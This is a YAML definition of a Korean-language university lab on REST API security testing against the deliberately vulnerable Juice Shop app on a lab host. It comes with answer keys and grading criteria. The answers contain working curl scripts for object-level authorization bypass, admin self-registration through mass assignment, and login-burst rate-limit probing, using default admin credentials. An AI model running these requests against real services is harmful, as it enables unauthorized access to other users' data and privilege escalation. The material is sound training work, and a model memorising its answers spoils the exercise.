lab_id: standalone-web-vuln-week12
title: "API 보안 점검 — REST API / mass assignment / rate limit / BOLA (6v6 + R/B/P)"
version: standalone-non-ai
course: web-vuln
week: 12
description: |
  REST API 점검 — OWASP API Top 10 (2023) 의 4 핵심 패턴:
  - API1 BOLA (Broken Object Level Authorization)
  - API3 Broken Object Property Level Authorization (mass assignment)
  - API4 Unrestricted Resource Consumption (rate limit 부재)
  - API6 Server Side Request Forgery (SSRF — W11 와 연결)
  JuiceShop 의 REST API (/api/* + /rest/*) 가 대상.
difficulty: medium
duration_minutes: 120
prerequisites:
  - "W04 의 JWT token + W09 의 IDOR 경험"
  - "attacker curl + jq + python3"
objectives:
  - "BOLA — 다른 user 의 Address / Card / Order 조회 시도"
  - "mass assignment — User 등록 시 role:admin 의 함께 전송 (서버 가 무시 하는지)"
  - "rate limit — 1 endpoint 에 100 회 burst 후 429 응답 여부"
  - "API enumeration — /api/* 모든 endpoint 의 HTTP 메서드 (GET/POST/PUT/DELETE/PATCH/OPTIONS)"
  - "Red/Blue/Purple — API burst 가 Wazuh dashboard 의 어떤 alert 가동"
pass_threshold: 0.6
steps:

  - order: 1
    instruction: |
      ## 🎯 MISSION — BOLA: 다른 user 의 Address / Card 조회

      **무엇을:** admin token 으로 /api/Addresss/{id}, /api/Cards/{id} 에 id=1,2,3 접근. 다른 user 의 데이터 접근 가능 여부.
    hint: "W04 의 admin token. for id in 1 2 3 4 5; curl -H 'Authorization: Bearer $T' http://juice.6v6.lab/api/Addresss/$id."
    category: api
    points: 12
    answer: |
      🤖 가이드:
      T=$(curl -s -X POST http://juice.6v6.lab/rest/user/login -H 'Content-Type: application/json' -d '{"email":"admin@juice-sh.op","password":"admin123"}' | jq -r '.authentication.token')
      for id in 1 2 3 4 5; do
        out=$(curl -s -H "Authorization: Bearer $T" "http://juice.6v6.lab/api/Addresss/$id" | head -c 100)
        echo "[$id] $out"
      done
    answer_detail: |
      JuiceShop 의 의도적 BOLA — UserId 검증 누락 endpoint 다수. 운영 환경 API 점검 의 1 순위.
    verify:
      intent: "BOLA 5 ID 시도 + 결과 분석"
      success_criteria:
        - "5 ID 시도"
        - "BOLA 판정"
      acceptable_methods:
        - "curl + jq"
      negative_signs:
        - "1~2 ID만"
    target_vm: attacker
    risk_level: medium

  - order: 2
    instruction: |
      ## 🎯 MISSION — mass assignment (role:admin 첨가)

      **무엇을:** /api/Users POST (등록) 시 body 에 `role:admin` 추가. 서버 가 무시 하면 안전, 그대로 처리 하면 mass assignment.
    hint: "POST /api/Users with `{...정상필드..., role:'admin'}`."
    category: api
    points: 12
    answer: |
      🤖 가이드:
      out=$(curl -s -X POST http://juice.6v6.lab/api/Users -H 'Content-Type: application/json' \
        -d '{"email":"hack@x.com","password":"H@ck1234","passwordRepeat":"H@ck1234","securityQuestion":{"id":1},"securityAnswer":"x","role":"admin"}')
      echo "$out" | head -c 200
      # 새 계정 으로 로그인 후 role 확인
      T=$(curl -s -X POST http://juice.6v6.lab/rest/user/login -H 'Content-Type: application/json' -d '{"email":"hack@x.com","password":"H@ck1234"}' | jq -r '.authentication.token')
      echo "$T" | cut -d. -f2 | base64 -d 2>/dev/null | jq '.data.role'
    answer_detail: |
      JuiceShop 의 challenge: "Admin Registration" — role 필드 무시 안 함. 운영 환경 의 ORM (Sequelize 등) default 처리 = 모든 필드 받음 → mass assignment.
    verify:
      intent: "mass assignment 시도 + role 검증"
      success_criteria:
        - "POST + role:admin"
        - "신규 계정 의 role 검증"
      acceptable_methods:
        - "curl + jq"
      negative_signs:
        - "검증 누락"
    target_vm: attacker
    risk_level: medium

  - order: 3
    instruction: |
      ## 🎯 MISSION — rate limit 부재

      **무엇을:** /rest/user/login 에 100 회 burst (병렬 또는 순차). 429 응답 가동 여부.
    hint: "for i in {1..100}; curl -s ... &; wait; 또는 hydra. 응답 429 비율 확인."
    category: api
    points: 10
    answer: |
      🤖 가이드:
      for i in $(seq 100); do
        curl -s -o /dev/null -w '%{http_code}\n' -X POST http://juice.6v6.lab/rest/user/login \
          -H 'Content-Type: application/json' -d '{"email":"x","password":"y"}' &
      done | sort | uniq -c | head
      wait
    answer_detail: |
      JuiceShop default = rate limit 없음. 운영 환경 의 reverse proxy / Express middleware (express-rate-limit) 필요. 429 응답 0% = critical finding.
    verify:
      intent: "100 burst + 응답 코드 분포"
      success_criteria:
        - "100 회 시도"
        - "응답 분포 분석"
      acceptable_methods:
        - "for loop 또는 ab / wrk"
      negative_signs:
        - "10 회 이하"
    target_vm: attacker
    risk_level: medium

  - order: 4
    instruction: |
      ## 🎯 MISSION — API enumeration + 보고서 + cleanup

      **무엇을:** /api/* /rest/* 의 메서드 (OPTIONS) 로 허용 메서드 식별 + 통합 보고서 + cleanup.
    hint: "for p in /api/Users /api/Products ...; curl -X OPTIONS $p | grep Allow."
    category: documentation
    points: 8
    answer: |
      🤖 가이드:
      for p in /api/Users /api/Products /api/Feedbacks /api/Complaints /rest/user/login /rest/products/search; do
        allow=$(curl -sX OPTIONS "http://juice.6v6.lab${p}" -i | grep -i allow | head -1)
        echo "${p} | ${allow}"
      done
      rm -f /tmp/*.out 2>/dev/null
    answer_detail: |
      허용 메서드 enumeration = API attack surface. DELETE 노출 시 critical (user/order 삭제 가능).
    verify:
      intent: "OPTIONS enumeration + 4 finding 보고서 + cleanup"
      success_criteria:
        - "5+ endpoint OPTIONS"
        - "4 finding 통합"
        - "cleanup"
      acceptable_methods:
        - "curl OPTIONS"
      negative_signs:
        - "1~2 endpoint만"
    target_vm: attacker
    risk_level: low
